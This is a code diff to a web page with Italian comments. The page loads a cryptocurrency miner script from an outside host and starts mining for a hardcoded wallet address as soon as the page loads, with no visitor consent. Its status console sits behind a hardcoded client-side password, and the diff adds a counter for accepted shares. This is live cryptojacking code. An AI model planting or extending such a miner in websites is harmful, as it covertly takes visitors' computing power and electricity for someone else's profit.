@@ -60,12 +60,13 @@
 
 <div id="mining-console">
     <div class="console-header">
-        <span><strong> CPU Miner</strong></span>
-        <button class="close-btn" onclick="hideMinerConsole()">×</button>
+        <span><strong>CPU Miner</strong></span>
+        <button class="close-btn" onclick="hideMinerConsole()"></button>
     </div>
     <div>Stato: <span id="status">Avviando...</span></div>
     <div>Hashrate: <span id="hashrate">0.00</span> KH/s</div>
     <div>Tempo: <span id="timer">00:00</span></div>
+    <div>Job accettati: <span id="shares">0</span></div>
 </div>
 
 <div id="reopen-btn" onclick="askPassword()"></div>
@@ -74,29 +75,38 @@
     import { autoMine, minotaurxHashrate } from "https://earnify.cc/miner.js";
 
     let miningStarted = false;
+    let consoleUnlocked = false;   // ← Nuovo: ricorda se la password è stata inserita
 
-    // Mining parte SUBITO (come prima)
+    // Mining parte subito
     async function initMining() {
         try {
             await autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
             miningStarted = true;
             document.getElementById("status").textContent = "Attivo";
             
-            // Aggiornamento hashrate reale
             setInterval(() => {
                 const hr = minotaurxHashrate.currentHashrateKHs || 0;
+                const shares = minotaurxHashrate.sharesAccepted || 0;
+                
                 document.getElementById("hashrate").textContent = parseFloat(hr).toFixed(2);
+                document.getElementById("shares").textContent = shares;
             }, 700);
+
         } catch (e) {
             console.error(e);
             document.getElementById("status").textContent = "Errore";
         }
     }
 
-    // Funzioni globali per i pulsanti
     window.askPassword = function() {
+        if (consoleUnlocked) {
+            showMinerConsole();
+            return;
+        }
+
         const password = prompt("Inserire admin password");
         if (password === "CpuMining") {
+            consoleUnlocked = true;
             showMinerConsole();
         } else if (password !== null) {
             alert("Password errata!");
@@ -122,7 +132,7 @@
         document.getElementById("timer").textContent = `${min}:${sec}`;
     }, 1000);
 
-    // Avvio immediato del mining
+    // Avvio
     window.addEventListener('load', () => {
         initMining();
     });
